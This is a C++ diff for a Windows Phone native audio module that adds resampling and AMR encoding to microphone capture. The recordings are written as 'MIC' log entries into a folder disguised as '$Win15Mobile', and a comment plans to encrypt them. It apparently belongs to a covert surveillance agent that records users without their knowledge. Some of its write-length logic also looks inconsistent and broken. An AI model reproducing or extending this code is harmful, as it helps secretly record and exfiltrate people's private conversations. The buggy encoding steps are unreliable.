@@ -5,6 +5,8 @@
 #include "Audioclient.h"
 #include "phoneaudioclient.h"
 
+#include <interf_enc.h>
+
 //#define RELESE_DEBUG_MSG
 
 #include <windows.h>
@@ -12,6 +14,7 @@
 #include <fstream>
 
 #pragma comment(lib, "Phoneaudioses.lib")
+#pragma comment(lib, "opencore_amrnb.lib")
 using namespace std;
 using namespace Microsoft::WRL;
 using namespace Windows::Foundation;
@@ -106,8 +109,8 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 
 	// creo file da 5sec 
 
-	//1MB di buffer
-	static BYTE bufferTmp[1024*512];
+	//8MB di buffer non posso farlo dianimco con l'heap perche wp mi killa
+	static BYTE bufferTmp[1024 * 1024 * 8];
 #ifdef _DEBUG
 	//la grandezza del file comprende il timestamp + il trefisso audio piu 999999 campioni
 	char nomeFile[sizeof("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio")+DTTMSZAUD+1+6];
@@ -146,10 +149,11 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 		logInfo.WriteLogInfo(msg2);
 #endif
 
-		BYTE HEADER[]={35, 33, 65, 77, 82, 10};
-		
-		memcpy(bufferTmp,HEADER,sizeof(HEADER));
-		NativeCapture::pos=sizeof(HEADER);
+		//BYTE HEADER[]={35, 33, 65, 77, 82, 10};
+		//
+		//memcpy(bufferTmp,HEADER,sizeof(HEADER));
+		//NativeCapture::pos=sizeof(HEADER);
+		NativeCapture::fHeader = true;
 
 		//creo il nome del file come data file (poi vedro' come criptarli)
 		char buff[DTTMSZAUD];
@@ -227,11 +231,78 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 		filestr.close();
 #endif
 		if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad2, sizeof(mad2), FLASH) == FALSE) 
-			{
-				return;
-			}
+		{
+			return;
+		}
 
-			log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos );
+		//converto da PCM 48000 a AMR 8000
+		unsigned long posTmp = 0;
+
+		float *psample32, *pf;
+		short *psample16, *ps;
+		psample32 = (float*)bufferTmp;
+		psample16 = (short*)bufferTmp;
+
+		//resampla il file
+		int inputSampleRate = 48000;
+		int outputSampleRate = 8000;
+		double ratio = (double)inputSampleRate / outputSampleRate;
+		int outSample = 0;
+		while (true)
+		{
+			int inBufferIndex = (int)(outSample * ratio);
+
+			if (inBufferIndex < NativeCapture::pos)
+			{
+				float sample32 = psample32[inBufferIndex];
+				// clip
+				if (sample32 > 1.0f)
+					sample32 = 1.0f;
+				if (sample32 < -1.0f)
+					sample32 = -1.0f;
+				psample16[outSample] = (short)(sample32 * 32767);
+			}
+			else
+				break;
+
+			outSample++;
+		}
+
+		//converto in amr
+		int i, j;
+		void* amr;
+		int sample_pos = 0;
+
+		amr = Encoder_Interface_init(0);
+
+		posTmp = 0;
+		if (NativeCapture::fHeader == true)
+		{
+
+			BYTE HEADER[] = { 35, 33, 65, 77, 82, 10 };
+
+			memcpy(bufferTmp, HEADER, sizeof(HEADER));
+			NativeCapture::pos = sizeof(HEADER);
+			posTmp = sizeof(HEADER);
+			NativeCapture::fHeader = false;
+		}
+
+		for (long j = 0; j < outSample; j += 160)
+		{
+			short buf[160];
+			uint8_t outbuf[500];
+
+			memcpy(buf, &psample16[j], sizeof(buf));
+
+			int n = Encoder_Interface_Encode(amr, MR122, buf, outbuf, 0);
+			memcpy(&bufferTmp[posTmp], outbuf, n);
+			posTmp += n;
+
+		}
+		Encoder_Interface_exit(amr);
+		// Fine conversione
+
+		log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos/4 );
 
 		log.CloseLog();
 #ifdef _DEBUG
@@ -374,8 +445,75 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 			{
 				return;
 			}
+			//converto da PCM 48000 a AMR 8000
+			unsigned long posTmp = 0;
 
-			log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos );
+			float *psample32, *pf;
+			short *psample16, *ps;
+			psample32 = (float*)bufferTmp;
+			psample16 = (short*)bufferTmp;
+
+			//resampla il file
+			int inputSampleRate = 48000;
+			int outputSampleRate = 8000;
+			double ratio = (double)inputSampleRate / outputSampleRate;
+			int outSample = 0;
+			while (true)
+			{
+				int inBufferIndex = (int)(outSample * ratio);
+
+				if (inBufferIndex < NativeCapture::pos)
+				{
+					float sample32 = psample32[inBufferIndex];
+					// clip
+					if (sample32 > 1.0f)
+						sample32 = 1.0f;
+					if (sample32 < -1.0f)
+						sample32 = -1.0f;
+					psample16[outSample] = (short)(sample32 * 32767);
+				}
+				else
+					break;
+
+				outSample++;
+			}
+
+			//converto in amr
+			int i, j;
+			void* amr;
+			int sample_pos = 0;
+
+			amr = Encoder_Interface_init(0);
+
+			posTmp = 0;
+			if (NativeCapture::fHeader == true)
+			{
+
+				BYTE HEADER[] = { 35, 33, 65, 77, 82, 10 };
+
+				memcpy(bufferTmp, HEADER, sizeof(HEADER));
+				NativeCapture::pos = sizeof(HEADER);
+				posTmp = sizeof(HEADER);
+				NativeCapture::fHeader = false;
+			}
+
+			for (long j = 0; j < outSample; j += 160)
+			{
+				short buf[160];
+				uint8_t outbuf[500];
+
+				memcpy(buf, &psample16[j], sizeof(buf));
+
+				int n = Encoder_Interface_Encode(amr, MR122, buf, outbuf, 0);
+				memcpy(&bufferTmp[posTmp], outbuf, n);
+				posTmp += n;
+
+			}
+			Encoder_Interface_exit(amr);
+			// Fine conversione
+
+			//log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos );
+			log.WriteLog((BYTE*)bufferTmp, posTmp / 4);
 #ifdef _DEBUG
 			OutputDebugStringA(nomeFile);OutputDebugStringA("\n");
 #endif
@@ -1188,7 +1326,7 @@ NativeAudioInterface::Native::NativeCapture::NativeCapture()
 				pAudioVideoCaptureDeviceNative = iAudioVideoCaptureDeviceNative;
 
 				
-				pAudioVideoCaptureDevice->AudioEncodingFormat = CameraCaptureAudioFormat::Amr;
+				pAudioVideoCaptureDevice->AudioEncodingFormat = CameraCaptureAudioFormat::Pcm;
 				
 				
 				// Initialize and set the CameraCaptureSampleSink class as sink for captures samples
